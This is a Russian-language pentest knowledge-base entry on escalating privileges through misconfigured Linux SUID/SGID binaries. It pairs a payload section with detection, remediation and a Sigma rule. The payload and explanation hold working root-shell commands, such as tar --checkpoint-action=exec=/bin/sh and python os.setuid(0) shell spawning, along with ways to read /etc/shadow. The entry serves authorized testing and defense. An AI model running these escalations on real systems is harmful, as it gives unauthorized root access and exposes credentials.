---
id: linux-suid-misconfiguration
title: "Linux: SUID/SGID-бинарник, позволяющий эскалацию"
type: privesc
target: linux
category: web
difficulty: intermediate
bypass: none
tags: [privesc, linux, suid, sgid, gtfobins, misconfiguration]
tested_on: ["Debian 12", "Ubuntu 22.04", "CentOS 7 (собственные ВМ)"]
success_rate: 0.6
risk: high
cwe: "CWE-269"
lab: null
last_verified: "2026-10-23"
references:
  - "https://gtfobins.github.io/"
  - "https://book.hacktricks.xyz/privilege-escalation/privilege-escalation"
---

# Linux: SUID/SGID-бинарник, позволяющий эскалацию

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# инвентаризация SUID/SGID-файлов
find / -perm -4000 -type f 2>/dev/null | sort
find / -perm -2000 -type f 2>/dev/null | sort

# сравнение с эталонным списком ОС (что добавлено вручную)
dpkg -V $(dpkg -S $(find / -perm -4000 -type f 2>/dev/null | tr '\n' ' ') 2>/dev/null | cut -d' ' -f2) 2>/dev/null

# проверка каждого нестандартного бинарника на наличие эксплойта/техники
# по GTFOBins: https://gtfobins.github.io/#+suid
# пример учебного стенда (создаётся администратором ВМ):
#   cp /bin/tar /usr/local/bin/backup-tool && chmod u+s /usr/local/bin/backup-tool
/usr/local/bin/backup-tool -cf /dev/null --checkpoint=1 \
  --checkpoint-action=exec=/bin/sh -P /etc/shadow
```

## Explanation

SUID-бит заставляет бинарник выполняться с правами владельца файла
(часто root), SGID — с правами группы. Сам по себе бит не уязвимость:
проблема возникает, когда **привилегированный бинарник позволяет
выполнить произвольную команду, прочитать произвольный файл или
выйти в оболочку**.

Типовые сценарии:

* бинарник с опцией запуска внешних программ (`tar --checkpoint-action=exec`,
  `find -exec`, `vim :!/bin/sh`, `less !sh`, `nmap --interactive`,
  `python -c 'import os; os.setuid(0); os.system("/bin/sh")'`);
* возможность читать произвольный файл от root (`less /etc/shadow`,
  `more`, `cat` в SUID-обёртке);
* SUID-копия интерпретатора или оболочки — прямая эскалация;
* SGID на каталог с общими скриптами (запись чужого кода);
* «домашние» SUID-обёртки администраторов (backup-tool, restart-svc),
  которые вызывают внешние пути без проверки.

Отдельный класс — **библиотечный перехват**: SUID-бинарник, загружающий
библиотеку из каталога, куда есть запись (`LD_LIBRARY_PATH`, `RPATH`,
или предзагрузка через `/etc/ld.so.preload`, если он доступен на запись).

Методика: собрать список SUID/SGID, вычесть эталонный набор дистрибутива,
проверить оставшиеся по GTFOBins, затем — пути вызова внутри
скриптов-обёрток (часто там встречается относительный путь вроде `service`
или `tar` без полного имени — тогда работает подмена через `PATH`).

## Detection

* Инвентаризация и контроль целостности: `aide`, `tripwire`, `rpm -Va`,
  `debsums` — любое появление нового SUID-файла должно быть алертом.
* Аудит выполнения: `auditd`-правило на `execve` с euid=0 и ppid
  от непривилегированного процесса; Sysmon for Linux (EventID 1).
* Сравнение списка SUID с эталонным для образа ОС (drift-детект).
* Логи sudo/su и аномальные родительские процессы
  (`bash -> tar -> sh` с euid 0).
* В контейнерах: `no-new-privileges` и отсутствие SUID-битов в образе
  (проверка в CI-сканере образов).

## Remediation

- Убрать SUID там, где он не нужен: большинство задач решается
  `sudo` с точными правилами вместо SUID-обёрток.
- Для необходимых SUID-бинарников: полный путь к вызываемым программам,
  сброс окружения (`env -i`), отказ от передачи пользовательских
  аргументов во внешние команды.
- Монтировать разделы с `nosuid` там, где исполняемые файлы не требуют
  привилегий (`/tmp`, `/home`, `/var/tmp`).
- Ограничить набор SUID в образах контейнеров и ВМ (сканирование в CI).
- Вместо «self-service restart» — systemd-юниты с `sudo`-правилами
  на конкретные команды и аргументы.
- Регулярный аудит: `find / -perm -4000 -type f` в baseline-проверке.


## Detection rules

```yaml
title: Запуск SUID-бинарника, не входящего в эталонный набор ОС
id: c3d4e5f6-0001-4c3d-9e4f-000000000201
status: experimental
description: >-
  Новый или нестандартный SUID/SGID-файл исполняется от имени root
  непривилегированным родителем — признак использования SUID для эскалации.
references:
  - https://attack.mitre.org/techniques/T1548/001/
  - https://gtfobins.github.io/
logsource:
  product: linux
  service: auditd
  definition: 'правила аудита на execve; Sysmon for Linux EventID 1'
detection:
  selection:
    EventType: EXECVE
    auid|lt: 1000              # пользователь не системный
    euid: 0
    Image|contains:
      - '/usr/local/bin/'
      - '/tmp/'
      - '/var/tmp/'
      - '/home/'
      - '/dev/shm/'
  filter_known:
    Image:
      - '/usr/bin/sudo'
      - '/usr/bin/passwd'
      - '/usr/bin/mount'
      - '/usr/bin/umount'
      - '/usr/bin/su'
      - '/usr/bin/newgrp'
      - '/usr/bin/chsh'
      - '/usr/bin/gpasswd'
  condition: selection and not filter_known
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - легитимные SUID-обёртки вендора ПО (внесите в filter_known после инвентаризации)
level: high
tags:
  - attack.privilege_escalation
  - attack.t1548.001
```
